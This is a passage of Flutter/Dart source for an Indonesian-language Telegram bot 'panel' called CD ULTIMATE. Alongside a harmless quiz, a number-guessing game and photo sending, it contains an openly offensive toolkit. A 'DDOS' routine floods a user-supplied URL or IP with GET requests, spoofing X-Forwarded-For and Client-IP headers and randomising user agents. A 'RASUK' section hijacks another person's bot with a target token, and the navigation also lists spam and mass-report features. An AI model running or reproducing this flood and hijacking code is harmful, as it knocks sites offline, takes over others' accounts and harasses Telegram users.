                  'can_send_other_messages': false,
                  'can_add_web_page_previews': false
                },
                'until_date': untilDate
              });
          if (result['success']) {
            _addLog('logBanGroup', '✅ Group $chatId di BAN!');
            _updateStatus('statusBanGroup', '✅ Group $chatId di BAN!');
          }
          break;
        case 'delete':
          result = await _callAPI(token, 'leaveChat', params: {'chat_id': chatId});
          if (result['success']) {
            _addLog('logBanGroup', '✅ Bot keluar dari $chatId!');
            _updateStatus('statusBanGroup', '✅ Bot keluar!');
          }
          break;
        case 'mute':
          result = await _callAPI(token, 'restrictChatMember', 
              params: {
                'chat_id': chatId,
                'user_id': int.parse(chatId),
                'permissions': {
                  'can_send_messages': false,
                  'can_send_media_messages': false,
                  'can_send_other_messages': false,
                  'can_add_web_page_previews': false
                },
                'until_date': untilDate != 0 ? untilDate : DateTime.now().millisecondsSinceEpoch ~/ 1000 + 86400
              });
          if (result['success']) {
            _addLog('logBanGroup', '✅ Group $chatId di MUTE!');
            _updateStatus('statusBanGroup', '✅ Group $chatId di MUTE!');
          }
          break;
      }
    } catch (e) {
      _addLog('logBanGroup', '❌ $e');
      _updateStatus('statusBanGroup', '❌ $e');
    }
  }

  Future<void> _listGroups() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusBanGroup', '❌ Token dulu!');
      return;
    }
    
    _updateStatus('statusBanGroup', '🔄 Mendapatkan group...');
    try {
      final result = await _callAPI(token, 'getUpdates');
      if (result['success'] && result['data']['result'] != null) {
        List<Map<String, dynamic>> groups = [];
        for (var update in result['data']['result']) {
          if (update['message'] != null && 
              update['message']['chat'] != null &&
              (update['message']['chat']['type'] == 'group' || 
               update['message']['chat']['type'] == 'supergroup')) {
            final chat = update['message']['chat'];
            groups.add({
              'id': chat['id'].toString(),
              'title': chat['title'] ?? 'Untitled',
              'type': chat['type']
            });
          }
        }
        // Remove duplicates
        var seen = <String>{};
        groups = groups.where((g) => seen.add(g['id']!)).toList();
        
        if (groups.isEmpty) {
          _addLog('logBanGroup', '❌ Tidak ada group');
          _updateStatus('statusBanGroup', '❌ Tidak ada group');
        } else {
          _addLog('logBanGroup', '✅ ${groups.length} group ditemukan');
          _updateStatus('statusBanGroup', '✅ ${groups.length} group ditemukan');
          // Show in dialog
          showDialog(
            context: context,
            builder: (context) => AlertDialog(
              title: const Text('📋 DAFTAR GROUP'),
              content: SizedBox(
                width: double.maxFinite,
                child: ListView.builder(
                  shrinkWrap: true,
                  itemCount: groups.length,
                  itemBuilder: (context, index) {
                    final g = groups[index];
                    return ListTile(
                      title: Text(g['title'] ?? 'Untitled'),
                      subtitle: Text('ID: ${g['id']}'),
                      onTap: () {
                        banGroupChatIdController.text = g['id']!;
                        Navigator.pop(context);
                        _addLog('logBanGroup', '✅ Memilih: ${g['title']} (${g['id']})');
                      },
                    );
                  },
                ),
              ),
              actions: [
                TextButton(
                  onPressed: () => Navigator.pop(context),
                  child: const Text('Tutup'),
                ),
              ],
            ),
          );
        }
      }
    } catch (e) {
      _addLog('logBanGroup', '❌ $e');
      _updateStatus('statusBanGroup', '❌ $e');
    }
  }

  // ============================================================
  // GAME
  // ============================================================
  
  Future<void> _startGame() async {
    final token = botTokenController.text.trim();
    final target = gameTargetController.text.trim();
    if (token.isEmpty || target.isEmpty) {
      _updateStatus('statusGame', '❌ Token dan Target WAJIB!');
      return;
    }
    if (gameType.isEmpty) {
      _updateStatus('statusGame', '❌ Pilih game dulu!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusGame', '❌ Token invalid');
      return;
    }
    
    setState(() {
      gameActive = true;
      statusGame = '🎮 Game ${gameType.toUpperCase()} dimulai...';
    });
    _addLog('logGame', '🎮 Memulai game ${gameType.toUpperCase()} dengan target $target');
    await _callAPI(token, 'sendMessage', 
        params: {'chat_id': target, 'text': '🎮 GAME ${gameType.toUpperCase()} DIMULAI!\n\n🤖 AI PXL siap bermain!'});
    
    // Simple game logic
    switch (gameType) {
      case 'tebak':
        final number = Random().nextInt(100) + 1;
        gameData['tebak'] = {'number': number, 'target': target};
        await _callAPI(token, 'sendMessage', 
            params: {'chat_id': target, 'text': '🤔 TEBAK ANGKA (1-100)\n\nAI sudah memilih angka! Kirim tebakanmu.'});
        break;
      case 'kuis':
        final questions = [
          {'q': 'Apa ibu kota Indonesia?', 'a': 'jakarta'},
          {'q': 'Siapa presiden pertama Indonesia?', 'a': 'soekarno'},
          {'q': 'Apa nama planet terbesar?', 'a': 'jupiter'},
        ];
        final q = questions[Random().nextInt(questions.length)];
        gameData['kuis'] = {'question': q, 'target': target};
        await _callAPI(token, 'sendMessage', 
            params: {'chat_id': target, 'text': '🧠 KUIS PXL!\n\n📝 ${q['q']}\n\nKetik jawabanmu!'});
        break;
      default:
        await _callAPI(token, 'sendMessage', 
            params: {'chat_id': target, 'text': '🎮 Game ${gameType.toUpperCase()} dimulai!'});
    }
  }

  void _stopGame() {
    setState(() {
      gameActive = false;
      gameType = '';
      gameData = {};
      statusGame = '⏹️ Game dihentikan!';
    });
    _addLog('logGame', '⏹️ Game dihentikan');
  }

  // ============================================================
  // KIRIM GAMBAR
  // ============================================================
  
  Future<void> _pickImage() async {
    final picker = ImagePicker();
    final picked = await picker.pickImage(source: ImageSource.gallery);
    if (picked != null) {
      setState(() {
        fotoKirimTerpilih = File(picked.path);
      });
      _addLog('logGambar', '✅ Gambar dipilih: ${picked.name}');
    }
  }

  Future<void> _kirimGambar() async {
    final token = botTokenController.text.trim();
    final target = gambarTargetController.text.trim();
    final caption = gambarCaptionController.text.trim();
    if (token.isEmpty || target.isEmpty) {
      _updateStatus('statusGambar', '❌ Token dan Target WAJIB!');
      return;
    }
    if (fotoKirimTerpilih == null) {
      _updateStatus('statusGambar', '❌ Pilih gambar dulu!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusGambar', '❌ Token invalid');
      return;
    }
    
    _addLog('logGambar', '📸 Mengirim gambar ke $target...');
    _updateStatus('statusGambar', '🔄 Mengirim gambar...');
    
    try {
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$token/sendPhoto'),
      );
      request.fields['chat_id'] = target;
      if (caption.isNotEmpty) request.fields['caption'] = caption;
      request.files.add(await http.MultipartFile.fromPath('photo', fotoKirimTerpilih!.path));
      
      final response = await request.send();
      if (response.statusCode == 200) {
        _addLog('logGambar', '✅ Gambar berhasil dikirim!');
        _updateStatus('statusGambar', '✅ Gambar berhasil dikirim!');
        setState(() {
          fotoKirimTerpilih = null;
        });
      } else {
        throw Exception('Gagal kirim gambar');
      }
    } catch (e) {
      _addLog('logGambar', '❌ Gagal: $e');
      _updateStatus('statusGambar', '❌ Gagal: $e');
    }
  }

  // ============================================================
  // ACAK-ACAK
  // ============================================================
  
  final List<String> randomNames = ['PXL Bot', 'Gacor Bot', 'CD Bot', 'Ultimate Bot', 'Pro Bot', 'Max Bot'];
  final List<String> randomDescs = ['Bot keren punya PXL', 'Bot gacor anti rungkad', 'Bot ultimate siap gacor'];
  final List<String> randomCommands = ['/start', '/help', '/info', '/ping', '/status', '/about'];
  
  String _randomItem(List<String> list) => list[Random().nextInt(list.length)];
  
  Future<void> _startAcak() async {
    if (isAcaking) {
      _updateStatus('statusAcak', '⚠️ SEDANG BERJALAN!');
      return;
    }
    final token = botTokenController.text.trim();
    final jumlah = int.tryParse(acakJumlahController.text) ?? 10;
    final delay = int.tryParse(acakDelayController.text) ?? 1000;
    
    if (token.isEmpty) {
      _updateStatus('statusAcak', '❌ Token dulu!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusAcak', '❌ Token invalid!');
      return;
    }
    
    setState(() {
      isAcaking = true;
      statusAcak = '🎲 ACAK DIMULAI (${acakLoop ? '∞' : jumlah}x, delay ${delay}ms)...';
    });
    _addLog('logAcak', '🎲 Memulai acak-acak bot...');
    
    int count = 0;
    int total = acakLoop ? 9999 : jumlah;
    
    acakTimer = Timer.periodic(Duration(milliseconds: delay), (timer) async {
      if (!isAcaking) {
        timer.cancel();
        setState(() {
          isAcaking = false;
          statusAcak = '⏹️ DIHENTIKAN!';
        });
        return;
      }
      
      count++;
      List<String> hasil = [];
      
      if (acakNama) {
        final nama = _randomItem(randomNames);
        hasil.add('📛 Nama: $nama');
        await _callAPI(token, 'setMyName', params: {'name': nama});
      }
      if (acakDeskripsi) {
        final desc = _randomItem(randomDescs);
        hasil.add('📝 Deskripsi: $desc');
        await _callAPI(token, 'setMyDescription', params: {'description': desc});
      }
      if (acakCommands) {
        final cmds = _randomItem(randomCommands);
        hasil.add('⚡ Commands: $cmds');
      }
      if (acakAbout) {
        final about = _randomItem(randomNames);
        hasil.add('ℹ️ About: $about');
        await _callAPI(token, 'setMyShortDescription', params: {'short_description': about});
      }
      
      if (hasil.isEmpty) hasil.add('⚠️ Tidak ada fitur dipilih!');
      final hasilText = hasil.join('\n');
      
      setState(() {
        acakHasil = '[$count] $hasilText';
        statusAcak = '🎲 [$count] Acak berjalan...';
      });
      _addLog('logAcak', '🎲 [$count] ${hasilText.substring(0, 50)}...');
      
      if (!acakLoop && count >= total) {
        timer.cancel();
        setState(() {
          isAcaking = false;
          statusAcak = '✅ ACAK SELESAI! $count x diacak';
        });
        _addLog('logAcak', '🏁 ACAK SELESAI!');
      }
    });
  }

  void _stopAcak() {
    if (isAcaking) {
      setState(() {
        isAcaking = false;
        statusAcak = '⏹️ DIHENTIKAN!';
      });
      acakTimer?.cancel();
    }
  }

  Future<void> _acakSemuaFitur() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusAcak', '❌ Token dulu!');
      return;
    }
    
    _updateStatus('statusAcak', '🔄 Mengacak semua fitur...');
    _addLog('logAcak', '🎯 Mengacak semua fitur sekaligus...');
    
    final nama = _randomItem(randomNames);
    await _callAPI(token, 'setMyName', params: {'name': nama});
    final desc = _randomItem(randomDescs);
    await _callAPI(token, 'setMyDescription', params: {'description': desc});
    final about = _randomItem(randomNames);
    await _callAPI(token, 'setMyShortDescription', params: {'short_description': about});
    
    setState(() {
      acakHasil = '✅ SEMUA FITUR DIACAK!\n\n📛 Nama: $nama\n📝 Deskripsi: $desc\nℹ️ About: $about';
      statusAcak = '✅ Semua fitur diacak!';
    });
    _addLog('logAcak', '✅ Semua fitur berhasil diacak!');
  }

  Future<void> _resetAcak() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusAcak', '❌ Token dulu!');
      return;
    }
    
    _updateStatus('statusAcak', '🔄 Mereset ke default...');
    _addLog('logAcak', '🔄 Mereset semua fitur ke default...');
    
    await _callAPI(token, 'setMyName', params: {'name': 'PXL Bot'});
    await _callAPI(token, 'setMyDescription', params: {'description': 'Bot Telegram keren punya PXL'});
    await _callAPI(token, 'setMyShortDescription', params: {'short_description': 'PXL Ultimate Bot'});
    
    setState(() {
      acakHasil = '🔄 RESET KE DEFAULT!\n\n📛 Nama: PXL Bot\n📝 Deskripsi: Bot Telegram keren punya PXL\nℹ️ About: PXL Ultimate Bot';
      statusAcak = '✅ Reset ke default!';
    });
    _addLog('logAcak', '✅ Reset ke default berhasil!');
  }

  // ============================================================
  // DDOS
  // ============================================================
  
  Future<void> _startDdos() async {
    if (isDdosRunning) {
      _updateStatus('statusDdos', '⚠️ SEDANG BERJALAN!');
      return;
    }
    
    final target = ddosTargetController.text.trim();
    final port = ddosPortController.text.trim();
    final jumlah = int.tryParse(ddosJumlahController.text) ?? 1000;
    final delay = int.tryParse(ddosDelayController.text) ?? 100;
    final method = ddosMethodController.text.trim();
    
    if (target.isEmpty) {
      _updateStatus('statusDdos', '❌ Masukkan Target URL / IP!');
      return;
    }
    
    final url = _normalizeTarget(target, port);
    setState(() {
      isDdosRunning = true;
      ddosTotal = 0;
      ddosSuccess = 0;
      ddosFailed = 0;
      ddosSpeed = 0;
      ddosProgress = 0.0;
      statusDdos = '💥 DDOS DIMULAI ke $url (${jumlah}x, delay ${delay}ms)';
    });
    _addLog('logDdos', '💥 DDOS Attack dimulai ke $url');
    
    int count = 0;
    int total = jumlah;
    DateTime startTime = DateTime.now();
    
    ddosTimer = Timer.periodic(Duration(milliseconds: max(delay, 10)), (timer) async {
      if (!isDdosRunning || count >= total) {
        timer.cancel();
        setState(() {
          isDdosRunning = false;
          statusDdos = count >= total ? '✅ DDOS SELESAI! Total: $ddosTotal | Sukses: $ddosSuccess | Gagal: $ddosFailed' : '⏹️ DIHENTIKAN!';
        });
        _addLog('logDdos', count >= total ? '🏁 DDOS SELESAI!' : '⏹️ DDOS dihentikan');
        return;
      }
      
      count++;
      final startReq = DateTime.now();
      
      try {
        final headers = {
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'X-Forwarded-For': _getRandomIP(),
          'Client-IP': _getRandomIP(),
        };
        if (ddosRandomUA) headers['User-Agent'] = _getRandomUA();
        
        final response = await http.get(
          Uri.parse(url),
          headers: headers,
        ).timeout(Duration(seconds: 5));
        
        setState(() {
          ddosTotal++;
          if (response.statusCode >= 200 && response.statusCode < 400) {
            ddosSuccess++;
          } else {
            ddosFailed++;
          }
          final elapsed = DateTime.now().difference(startTime).inSeconds;
          ddosSpeed = elapsed > 0 ? ddosTotal ~/ elapsed : 0;
          ddosProgress = count / total * 100;
          statusDdos = '💥 [$count/$total] Sukses: $ddosSuccess | Gagal: $ddosFailed | ${ddosSpeed} req/s';
        });
        
        if (response.statusCode >= 200 && response.statusCode < 400) {
          _addLog('logDdos', '✅ [$count/$total] Success (${response.statusCode})');
        } else {
          _addLog('logDdos', '⚠️ [$count/$total] Response ${response.statusCode}');
        }
      } catch (e) {
        setState(() {
          ddosTotal++;
          ddosFailed++;
          ddosProgress = count / total * 100;
          statusDdos = '💥 [$count/$total] Sukses: $ddosSuccess | Gagal: $ddosFailed | ${ddosSpeed} req/s';
        });
        _addLog('logDdos', '❌ [$count/$total] Error: ${e.toString().substring(0, 30)}');
      }
    });
  }

  void _stopDdos() {
    if (isDdosRunning) {
      setState(() {
        isDdosRunning = false;
        statusDdos = '⏹️ DIHENTIKAN!';
      });
      ddosTimer?.cancel();
    }
  }

  // ============================================================
  // SYNC JSONBIN (Sederhana)
  // ============================================================
  
  Future<void> _syncData() async {
    final binId = binIdController.text.trim();
    final apiKey = apiKeyController.text.trim();
    if (binId.isEmpty || apiKey.isEmpty) {
      setState(() {
        syncMsg = '❌ Masukkan Bin ID dan API Key!';
      });
      return;
    }
    
    setState(() {
      syncStatus = '⏳ Syncing...';
      syncMsg = '';
    });
    
    try {
      final response = await http.get(
        Uri.parse('https://api.jsonbin.io/v3/b/$binId/latest'),
        headers: {'X-Master-Key': apiKey},
      );
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        // Simpan data ke shared preferences
        final prefs = await SharedPreferences.getInstance();
        prefs.setString('cdpanel_sync_data', jsonEncode(data));
        setState(() {
          syncStatus = '✅ Synced!';
          syncMsg = '✅ Data berhasil disync!';
        });
        _addLog('logRasuk', '✅ Data berhasil disync!');
      } else {
        throw Exception('Gagal sync');
      }
    } catch (e) {
      setState(() {
        syncStatus = '❌ Gagal';
        syncMsg = '❌ Error: $e';
      });
    }
  }

  // ============================================================
  // BUILD UI
  // ============================================================
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0A0A0A), Color(0xFF1A1A1A)],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header
                Center(
                  child: Column(
                    children: [
                      Text(
                        'CD ULTIMATE',
                        style: TextStyle(
                          fontSize: 28,
                          fontWeight: FontWeight.bold,
                          color: Colors.pink.shade300,
                          shadows: [
                            Shadow(color: Colors.pink.shade300.withOpacity(0.3), blurRadius: 20),
                          ],
                        ),
                      ),
                      const Text(
                        'PXL · PANEL · GACOR',
                        style: TextStyle(color: Colors.grey, fontSize: 12, letterSpacing: 3),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                
                // Token
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: const Color(0xFF222222)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        '🤖 TOKEN BOT',
                        style: TextStyle(color: Colors.grey, fontSize: 10, letterSpacing: 1),
                      ),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Expanded(
                            child: TextField(
                              controller: botTokenController,
                              style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
                              decoration: InputDecoration(
                                hintText: 'Masukkan Token Bot...',
                                hintStyle: TextStyle(color: Colors.grey.shade600, fontSize: 12),
                                filled: true,
                                fillColor: const Color(0xFF222222),
                                border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(8),
                                  borderSide: BorderSide.none,
                                ),
                                contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          ElevatedButton(
                            onPressed: _validasiToken,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.pink.shade300,
                              foregroundColor: Colors.black,
                              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                            ),
                            child: const Text('VALIDASI', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
                          ),
                        ],
                      ),
                      const SizedBox(height: 4),
                      Text(
                        statusToken,
                        style: TextStyle(
                          fontSize: 11,
                          color: statusToken.contains('✅') ? const Color(0xFF00FF88) :
                                 statusToken.contains('❌') ? Colors.red.shade400 :
                                 Colors.grey.shade500,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 12),
                
                // Edit Bot
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: const Color(0xFF222222)),
                  ),
                  child: Column(
                    children: [
                      Row(
                        children: [
                          _buildEditButton('🖼️', 'FOTO', () {
                            setState(() => showEditBot = !showEditBot);
                          }),
                          _buildEditButton('📛', 'NAMA', () {
                            setState(() => showEditBot = !showEditBot);
                          }),
                          _buildEditButton('📝', 'DESKRIPSI', () {
                            setState(() => showEditBot = !showEditBot);
                          }),
                          _buildEditButton('✅', 'TERAPKAN', _applyBotChanges, color: Colors.pink.shade300),
                        ],
                      ),
                      if (showEditBot) ...[
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: TextField(
                                controller: inputBotNameController,
                                style: const TextStyle(color: Colors.white, fontSize: 12),
                                decoration: InputDecoration(
                                  labelText: '📛 NAMA',
                                  labelStyle: TextStyle(color: Colors.grey.shade500, fontSize: 10),
                                  filled: true,
                                  fillColor: const Color(0xFF222222),
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(8),
                                    borderSide: BorderSide.none,
                                  ),
                                  contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                ),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: TextField(
                                controller: inputBotDescController,
                                style: const TextStyle(color: Colors.white, fontSize: 12),
                                decoration: InputDecoration(
                                  labelText: '📝 DESKRIPSI',
                                  labelStyle: TextStyle(color: Colors.grey.shade500, fontSize: 10),
                                  filled: true,
                                  fillColor: const Color(0xFF222222),
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(8),
                                    borderSide: BorderSide.none,
                                  ),
                                  contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                ),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        ElevatedButton.icon(
                          onPressed: _pickImage,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: const Color(0xFF1A1A1A),
                            foregroundColor: Colors.white,
                            side: const BorderSide(color: Colors.grey, width: 1),
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                          ),
                          icon: const Icon(Icons.photo, size: 16),
                          label: Text(fotoKirimTerpilih != null ? '✅ ${fotoKirimTerpilih!.path.split('/').last}' : '📤 Pilih Foto'),
                        ),
                      ],
                    ],
                  ),
                ),
                const SizedBox(height: 12),
                
                // Sync
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: const Color(0xFF222222)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Text('☁️ SYNC DATA', style: TextStyle(color: Colors.grey, fontSize: 9, letterSpacing: 1)),
                          const Spacer(),
                          Text(syncStatus, style: TextStyle(color: Colors.grey.shade600, fontSize: 8)),
                        ],
                      ),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Expanded(
                            child: TextField(
                              controller: binIdController,
                              style: const TextStyle(color: Colors.white, fontSize: 12),
                              decoration: InputDecoration(
                                hintText: 'Bin ID',
                                hintStyle: TextStyle(color: Colors.grey.shade600, fontSize: 11),
                                filled: true,
                                fillColor: const Color(0xFF222222),
                                border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(8),
                                  borderSide: BorderSide.none,
                                ),
                                contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          Expanded(
                            child: TextField(
                              controller: apiKeyController,
                              style: const TextStyle(color: Colors.white, fontSize: 12),
                              decoration: InputDecoration(
                                hintText: 'API Key',
                                hintStyle: TextStyle(color: Colors.grey.shade600, fontSize: 11),
                                filled: true,
                                fillColor: const Color(0xFF222222),
                                border: OutlineInputBorder(
                                  borderRadius: BorderRadius.circular(8),
                                  borderSide: BorderSide.none,
                                ),
                                contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          ElevatedButton(
                            onPressed: _syncData,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.cyan.shade300,
                              foregroundColor: Colors.black,
                              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                            ),
                            child: const Text('SYNC', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 10)),
                          ),
                        ],
                      ),
                      if (syncMsg.isNotEmpty)
                        Padding(
                          padding: const EdgeInsets.only(top: 4),
                          child: Text(
                            syncMsg,
                            style: TextStyle(
                              fontSize: 8,
                              color: syncMsg.contains('✅') ? const Color(0xFF00FF88) : Colors.red.shade400,
                            ),
                          ),
                        ),
                    ],
                  ),
                ),
                const SizedBox(height: 12),
                
                // Navigation
                _buildNavigation(),
                const SizedBox(height: 12),
                
                // Sections
                _buildSection('sectionRasuk', '👻 RASUK', _buildRasukSection()),
                _buildSection('sectionSpam', '🚀 SPAM', _buildSpamSection()),
                _buildSection('sectionBan', '🔨 BAN', _buildBanSection()),
                _buildSection('sectionBanGroup', '🚫 BAN GRP', _buildBanGroupSection()),
                _buildSection('sectionBroadcast', '📢 BC', _buildBroadcastSection()),
                _buildSection('sectionCekId', '🆔 CEK ID', _buildCekIdSection()),
                _buildSection('sectionReport', '📝 REPORT', _buildReportSection()),
                _buildSection('sectionGroup', '🖼️ GROUP', _buildGroupSection()),
                _buildSection('sectionGame', '🎮 GAME', _buildGameSection()),
                _buildSection('sectionKirimGambar', '📸 GAMBAR', _buildKirimGambarSection()),
                _buildSection('sectionAcakAcak', '🎲 ACAK', _buildAcakSection()),
                _buildSection('sectionDdos', '💥 DDOS', _buildDdosSection()),
                
                const SizedBox(height: 16),
                Center(
                  child: Text(
                    'CREATED BY PXL · CD ULTIMATE 🤪💩',
                    style: TextStyle(color: Colors.grey.shade800, fontSize: 8, letterSpacing: 2),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildEditButton(String icon, String label, VoidCallback onTap, {Color? color}) {
    return Expanded(
      child: InkWell(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            color: const Color(0xFF1A1A1A),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: color ?? Colors.grey.shade700),
          ),
          child: Column(
            children: [
              Text(icon, style: const TextStyle(fontSize: 16)),
              Text(
                label,
                style: TextStyle(
                  color: color ?? Colors.grey.shade400,
                  fontSize: 9,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildNavigation() {
    final sections = [
      {'id': 'sectionRasuk', 'icon': '👻', 'label': 'RASUK'},
      {'id': 'sectionSpam', 'icon': '🚀', 'label': 'SPAM'},
      {'id': 'sectionBan', 'icon': '🔨', 'label': 'BAN'},
      {'id': 'sectionBanGroup', 'icon': '🚫', 'label': 'BAN GRP'},
      {'id': 'sectionBroadcast', 'icon': '📢', 'label': 'BC'},
      {'id': 'sectionCekId', 'icon': '🆔', 'label': 'CEK ID'},
      {'id': 'sectionReport', 'icon': '📝', 'label': 'REPORT'},
      {'id': 'sectionGroup', 'icon': '🖼️', 'label': 'GROUP'},
      {'id': 'sectionGame', 'icon': '🎮', 'label': 'GAME'},
      {'id': 'sectionKirimGambar', 'icon': '📸', 'label': 'GAMBAR'},
      {'id': 'sectionAcakAcak', 'icon': '🎲', 'label': 'ACAK'},
      {'id': 'sectionDdos', 'icon': '💥', 'label': 'DDOS'},
    ];
    
    return Wrap(
      spacing: 4,
      runSpacing: 4,
      children: sections.map((s) {
        final isActive = selectedSection == s['id'];
        return InkWell(
          onTap: () => setState(() => selectedSection = s['id']!),
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              color: isActive ? Colors.pink.shade300.withOpacity(0.1) : Colors.transparent,
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: isActive ? Colors.pink.shade300 : Colors.grey.shade800,
                width: 1,
              ),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Text(s['icon']!, style: const TextStyle(fontSize: 14)),
                const SizedBox(width: 4),
                Text(
                  s['label']!,
                  style: TextStyle(
                    color: isActive ? Colors.pink.shade300 : Colors.grey.shade500,
                    fontSize: 9,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildSection(String id, String title, Widget child) {
    final isVisible = selectedSection == id;
    return AnimatedSwitcher(
      duration: const Duration(milliseconds: 300),
      child: isVisible
          ? Container(
              key: ValueKey(id),
              margin: const EdgeInsets.only(top: 8),
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: const Color(0xFF0D0D0D),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(color: const Color(0xFF1A1A1A)),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Text(
                        title,
                        style: TextStyle(
                          color: Colors.pink.shade300,
                          fontSize: 13,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1,
                        ),
                      ),
                      Expanded(
                        child: Container(
                          height: 1,
                          margin: const EdgeInsets.only(left: 8),
                          color: const Color(0xFF1A1A1A),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  child,
                ],
              ),
            )
          : const SizedBox.shrink(),
    );
  }

  // ============================================================
  // SECTION BUILDER: RASUK
  // ============================================================
  
  Widget _buildRasukSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ RASUK: Kendalikan bot target!'),
        const SizedBox(height: 8),
        _buildLabel('🎯 TOKEN BOT TARGET'),
        TextField(
          controller: targetTokenController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('8123456789:AAHdqTzR3Xx...'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📌 CHAT ID TARGET'),
        TextField(
          controller: rasukTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('@username atau 123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('💬 PESAN RASUK'),
        TextField(
          controller: rasukPesanController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Pesan rasuk...'),
        ),
        const SizedBox(height: 8),
        _buildJumlahDelay(
          rasukJumlahController,
          rasukDelayController,
          '🔁 JUMLAH:',
          '⏱️ DELAY (ms):',
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: isRasuking ? null : _startRasuk,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red.shade400,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: Text(isRasuking ? '⏳ BERJALAN...' : '👻 MULAI RASUK', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: isRasuking ? _stopRasuk : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.grey.shade800,
                  foregroundColor: Colors.white,
